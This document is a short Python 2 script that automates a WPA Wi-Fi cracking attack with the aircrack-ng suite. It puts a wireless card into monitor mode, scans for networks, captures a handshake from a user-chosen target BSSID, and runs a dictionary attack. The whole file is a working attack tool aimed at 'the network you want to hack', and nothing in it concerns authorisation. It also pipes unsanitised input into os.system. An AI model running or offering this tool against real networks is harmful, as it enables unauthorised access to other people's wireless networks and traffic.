#! /usr/bin/python
# -*- coding: utf-8 -*-
#a small script to help you crack nearby wireless networks.
#this script uses aircrack-ng suite
#author https://github.com/yelhamer
from termcolor import colored
import os
import time
s = """

 ▄▄▄      ██▓██▀███  ▄████▄  ██▀███  ▄▄▄      ▄████▄  ██ ▄█▀
▒████▄   ▓██▓██ ▒ ██▒██▀ ▀█ ▓██ ▒ ██▒████▄   ▒██▀ ▀█  ██▄█▒ 
▒██  ▀█▄ ▒██▓██ ░▄█ ▒▓█    ▄▓██ ░▄█ ▒██  ▀█▄ ▒▓█    ▄▓███▄░ 
░██▄▄▄▄██░██▒██▀▀█▄ ▒▓▓▄ ▄██▒██▀▀█▄ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄ 
 ▓█   ▓██░██░██▓ ▒██▒ ▓███▀ ░██▓ ▒██▒▓█   ▓██▒ ▓███▀ ▒██▒ █▄
 ▒▒   ▓▒█░▓ ░ ▒▓ ░▒▓░ ░▒ ▒  ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒
  ▒   ▒▒ ░▒ ░ ░▒ ░ ▒░ ░  ▒    ░▒ ░ ▒░ ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░
  ░   ▒   ▒ ░ ░░   ░░         ░░   ░  ░   ▒  ░       ░ ░░ ░ 
      ░  ░░    ░    ░ ░        ░          ░  ░ ░     ░  ░   
                    ░                        ░              

"""
a = os.system
print s
a('apt-get install aircrack-ng')
print colored("This is just a simple script that can help you crack wireless network's pass", "green")
time.sleep( 5 )
print colored('first, enter your wireless card (useualy wlan0) then hit enter', 'green')
time.sleep( 5 )
print colored('it will give you a list of avaailable wireless networks in your area', 'green')
time.sleep( 5 )
print colored('copy their bssid and channel and save them for later', 'green')
time.sleep( 5 )
print colored('lets role!', 'green')
#askes for wireless card to apply monitor mode on it
wireless_card = raw_input("enter your wireless card:")
time.sleep( 1 )
print colored('thanks', 'green')
time.sleep( 0.5 )
#turns wireless card into monitor mod
mon0 = 'ifconfig '+wireless_card+' down && iwconfig '+wireless_card+' mode monitor && ifconfig '+wireless_card+' up'
a(mon0)
#runs a scan with airodump-ng to get available wifi
airodump = 'airodump-ng '+wireless_card+''
a(airodump)
#asks for your target's bssid
bssid = raw_input("enter the bssid of the network you want to hack:")
time.sleep( 0.5 )
#asks for your target's channel
channel = raw_input("Enter the channel that the wireless network is currently running on:")
time.sleep( 0.5 )
save = raw_input("Where should i save the captured hanshake?")
time.sleep( 0.5)
print colored("Thanks!", "green"),
time.sleep( 0.5 )
print colored(".","red"),
time.sleep( 1 )
print colored(".","red"),
time.sleep( 1 )
print colored(".","red"),
time.sleep( 1 )
print colored("Airodump will start, meanwhile, go run deauth.py in a new terminal", "red")
time.sleep( 1 )
#starts airodump-ng on a network to capture hanshakes and open new xterm to deauth connected devices
airodump2 = 'airodump-ng -c '+channel+' --bssid '+bssid+' -w '+save+' '+wireless_card+' '
a(airodump2)
print colored("handshake captured", "green")
time.sleep( 1 )
print colored("cracking the hanshake with aircrack-ng will start...", "green")
time.sleep( 2 )
wordlist = raw_input("Specify the path to the dictionaty you want to use in this attack")
save2 = raw_input("Enter the .cap file name that is saved in the directory you previously entered: e.g: 01.cap")
time.sleep( 1 )
print colored("This could take a while according to the wordlist you are using, so have patience", "red")
crack = 'aircrack-ng -a 2 '+save+''+save2+' -w '+wordlist+''
a(crack)
